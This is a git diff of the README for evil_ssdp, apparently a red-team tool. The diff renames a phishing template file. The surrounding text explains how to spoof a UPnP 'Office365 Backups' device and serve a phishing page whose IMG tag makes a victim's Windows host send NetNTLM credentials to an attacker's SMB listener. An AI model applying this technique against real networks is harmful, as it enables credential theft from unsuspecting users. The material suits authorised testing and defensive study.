@@ -89,10 +89,10 @@ The following templates come with the tool. If you have good design skills, plea
 
 Creating your own templates is easy. Simply copy the folder of an existing template and edit the following files:
 - `device.xml`:         Here is where you will define what the device looks like inside Windows Explorer.
-- `present.html`:       This is the phishing page displayed when a target opens the evil device. Craft anything you like here. Note that Python's string template will parse this, so you will need to use `$$` in place of `$` anywhere to escape the template engine.
+- `login.html`:       This is the phishing page displayed when a target opens the evil device. Craft anything you like here. Note that Python's string template will parse this, so you will need to use `$$` in place of `$` anywhere to escape the template engine.
 - `service.xml`:        Not yet implemented. May be needed for more complex UPNP spoofing in the future.
 
-In your phishing page (`present.html`), use variables like the following for additional functionality:
+In your phishing page (`login.html`), use variables like the following for additional functionality:
 
 ```
 # The following line will initiate a NetNTLM challenge/response using the IP
@@ -164,7 +164,7 @@ evil_ssdp will pull the 'device.xml' file from the chosen templates folder and d
   </specVersion>
   <URLBase>http://$local_ip:$local_port</URLBase>
   <device>
-    <presentationURL>http://$local_ip:$local_port/present.html</presentationURL>
+    <presentationURL>http://$local_ip:$local_port/login.html</presentationURL>
     <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
     <friendlyName>Office365 Backups</friendlyName>
     <modelDescription>Secure Storage for Office365</modelDescription>
@@ -185,7 +185,7 @@ evil_ssdp will pull the 'device.xml' file from the chosen templates folder and d
 </root>
 ```
 
-A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evil_ssdp will host this file automatically (present.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).
+A key line in this file contains the 'Presentation URL'. This is what will load in a user's browser if they decide to manually double-click on the UPNP device. evil_ssdp will host this file automatically (login.html from the chosen template folder), plugging in your source IP address into an IMG tag to access an SMB share that you can host with tools like [Impacket](https://www.coresecurity.com/corelabs-research/open-source-tools/impacket), [Responder](https://github.com/SpiderLabs/Responder), or [Metasploit](https://www.rapid7.com/db/modules/auxiliary/server/capture/smb).
 
 The IMG tage looks like this:
 
